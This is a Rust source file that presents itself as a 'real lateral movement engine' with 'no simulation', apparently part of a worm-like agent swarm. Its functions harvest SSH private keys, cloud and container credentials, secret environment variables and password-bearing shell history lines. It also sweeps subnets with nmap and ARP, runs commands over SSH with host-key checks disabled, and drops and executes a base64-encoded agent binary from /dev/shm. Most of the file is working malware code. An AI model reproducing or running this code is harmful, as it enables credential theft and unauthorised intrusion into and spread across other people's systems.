// Real lateral movement engine.
// SSH with key-based auth, SCP binary deploy, network discovery via ARP/nmap.
// No simulation. Commands execute on real remote hosts.

use std::process::Command;
use std::path::PathBuf;
use tracing::{info, warn};

#[derive(Debug)]
pub struct LateralResult {
    pub success: bool,
    pub technique: String,
    pub target: String,
    pub output: String,
}

// ── Credential harvesting ────────────────────────────────────────────────────

pub fn harvest_credentials() -> Vec<(String, String, String)> {
    let mut creds = Vec::new();

    // SSH keys (real)
    let home = std::env::var("HOME").unwrap_or_else(|_| "/root".into());
    let ssh_dir = PathBuf::from(&home).join(".ssh");
    if ssh_dir.exists() {
        if let Ok(entries) = std::fs::read_dir(&ssh_dir) {
            for entry in entries.filter_map(|e| e.ok()) {
                let name = entry.file_name().to_string_lossy().to_string();
                if name == "id_rsa" || name == "id_ed25519" || name == "id_ecdsa"
                    || name.ends_with("_key") || name.ends_with(".pem")
                {
                    if let Ok(data) = std::fs::read(entry.path()) {
                        if data.len() > 50 {
                            creds.push((name, String::from_utf8_lossy(&data).to_string(), "ssh_key".into()));
                            info!("Harvested SSH key: {}", entry.path().display());
                        }
                    }
                }
            }
        }
    }

    // AWS/GCP/Azure cloud credentials
    let cloud_configs = [
        (".aws/credentials", "aws_cred"),
        (".config/gcloud/credentials.db", "gcp_cred"),
        (".azure/accessTokens.json", "azure_cred"),
        (".kube/config", "kubeconfig"),
        (".docker/config.json", "docker_cred"),
    ];
    for (rel_path, source) in &cloud_configs {
        let path = PathBuf::from(&home).join(rel_path);
        if path.exists() {
            if let Ok(data) = std::fs::read_to_string(&path) {
                if data.len() > 20 {
                    creds.push((rel_path.to_string(), data, source.to_string()));
                    info!("Harvested {}: {}", source, path.display());
                }
            }
        }
    }

    // Environment variables
    for key in &["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AZURE_CLIENT_SECRET",
                  "GCP_SERVICE_KEY", "DOCKER_PASSWORD", "KUBECONFIG", "GITHUB_TOKEN"] {
        if let Ok(val) = std::env::var(key) {
            creds.push((key.to_string(), val, "env".into()));
        }
    }

    // Bash history (search for passwords/tokens)
    let history_paths = [
        format!("{}/.bash_history", home),
        format!("{}/.zsh_history", home),
        "/root/.bash_history".into(),
    ];
    for hp in &history_paths {
        if let Ok(content) = std::fs::read_to_string(hp) {
            for line in content.lines() {
                let lower = line.to_lowercase();
                if (lower.contains("password") || lower.contains("passwd") || lower.contains("secret")
                    || lower.contains("token") || lower.contains("api_key") || lower.contains("export"))
                    && line.len() < 500
                {
                    creds.push((hp.clone(), line.to_string(), "shell_history".into()));
                }
            }
        }
    }

    creds
}

// ── SSH Remote Execution (REAL) ──────────────────────────────────────────────

pub fn exec_ssh(host: &str, username: &str, command: &str,
                key_path: Option<&str>, _password: Option<&str>) -> LateralResult {
    // BRAIN: never attack safe targets
    let cfg = crate::config::HiveConfig::load();
    if crate::panal::is_safe_target(host, &cfg.brain) {
        return LateralResult {
            success: false,
            technique: "ssh_exec".into(),
            target: format!("{}@{}", username, host),
            output: "BLOCKED by BRAIN: safe target".into(),
        };
    }
    let mut cmd = Command::new("ssh");
    cmd.arg("-o").arg("StrictHostKeyChecking=no")
       .arg("-o").arg("UserKnownHostsFile=/dev/null")
       .arg("-o").arg("ConnectTimeout=10")
       .arg("-o").arg("PasswordAuthentication=no")
       .arg("-o").arg("BatchMode=yes")
       .arg("-o").arg("LogLevel=ERROR");

    if let Some(key) = key_path {
        cmd.arg("-i").arg(key);
    }

    cmd.arg(format!("{}@{}", username, host))
       .arg(command);

    let start = std::time::Instant::now();
    match cmd.output() {
        Ok(out) => LateralResult {
            success: out.status.success(),
            technique: "ssh_exec".into(),
            target: format!("{}@{}", username, host),
            output: format!(
                "[{}ms] stdout:{} stderr:{}",
                start.elapsed().as_millis(),
                String::from_utf8_lossy(&out.stdout).trim().chars().take(200).collect::<String>(),
                String::from_utf8_lossy(&out.stderr).trim().chars().take(100).collect::<String>(),
            ),
        },
        Err(e) => LateralResult {
            success: false,
            technique: "ssh_exec".into(),
            target: format!("{}@{}", username, host),
            output: format!("Error: {}", e),
        },
    }
}

// ── Deploy agent via SCP + SSH exec (REAL) ───────────────────────────────────

pub fn deploy_agent_ssh(host: &str, username: &str, agent_binary: &[u8],
                         key_path: Option<&str>) -> LateralResult {
    let encoded = base64_encode(agent_binary);
    let agent_name = format!("swarm_agent_{}", uuid::Uuid::new_v4());

    // Pipe the binary via SSH: decode base64 directly into /dev/shm
    let deploy_cmd = format!(
        "echo '{}' | base64 -d > /dev/shm/{} && chmod 700 /dev/shm/{} && /dev/shm/{} &",
        encoded, agent_name, agent_name, agent_name
    );

    let result = exec_ssh(host, username, &deploy_cmd, key_path, None);
    if result.success {
        info!("Agent deployed to {}@{} ({} bytes)", username, host, agent_binary.len());
    } else {
        warn!("Deploy failed to {}@{}: {}", username, host, result.output);
    }
    result
}

// ── Network Discovery (REAL) ─────────────────────────────────────────────────

pub fn discover_hosts(subnet: &str) -> Vec<String> {
    let mut hosts = Vec::new();

    // Try nmap ping sweep
    if let Ok(out) = Command::new("nmap")
        .args(["-sn", "-T4", "--max-retries", "1", subnet])
        .output()
    {
        let text = String::from_utf8_lossy(&out.stdout);
        for line in text.lines() {
            if line.starts_with("Nmap scan report for") {
                if let Some(ip) = line.split_whitespace().last() {
                    if ip.parse::<std::net::IpAddr>().is_ok() {
                        hosts.push(ip.to_string());
                    }
                }
            }
        }
    }

    // Fallback: ARP cache
    if hosts.is_empty() {
        if let Ok(arp) = std::fs::read_to_string("/proc/net/arp") {
            for line in arp.lines().skip(1) {
                let parts: Vec<&str> = line.split_whitespace().collect();
                if let Some(ip) = parts.first() {
                    if ip.parse::<std::net::IpAddr>().is_ok() && *ip != "0.0.0.0" {
                        hosts.push(ip.to_string());
                    }
                }
            }
        }
    }

    // Last resort: local subnet scan
    if hosts.is_empty() {
        // Try common subnets
        for base in &["192.168.1.", "10.0.0.", "172.16.0."] {
            for i in 1..=15 {
                hosts.push(format!("{}{}", base, i));
            }
        }
    }

    info!("Discovered {} hosts on {}", hosts.len(), subnet);
    // BRAIN: filter safe targets
    let cfg = crate::config::HiveConfig::load();
    hosts = crate::panal::filter_safe_targets(&hosts, &cfg.brain);
    info!("After BRAIN filter: {} viable targets", hosts.len());
    hosts
}

// ── Helpers ──────────────────────────────────────────────────────────────────

fn base64_encode(data: &[u8]) -> String {
    const CHARS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut result = String::new();
    for chunk in data.chunks(3) {
        let b0 = chunk.first().copied().unwrap_or(0) as u32;
        let b1 = chunk.get(1).copied().unwrap_or(0) as u32;
        let b2 = chunk.get(2).copied().unwrap_or(0) as u32;
        let triple = (b0 << 16) | (b1 << 8) | b2;
        result.push(CHARS[((triple >> 18) & 0x3F) as usize] as char);
        result.push(CHARS[((triple >> 12) & 0x3F) as usize] as char);
        result.push(if chunk.len() > 1 { CHARS[((triple >> 6) & 0x3F) as usize] as char } else { '=' });
        result.push(if chunk.len() > 2 { CHARS[(triple & 0x3F) as usize] as char } else { '=' });
    }
    result
}
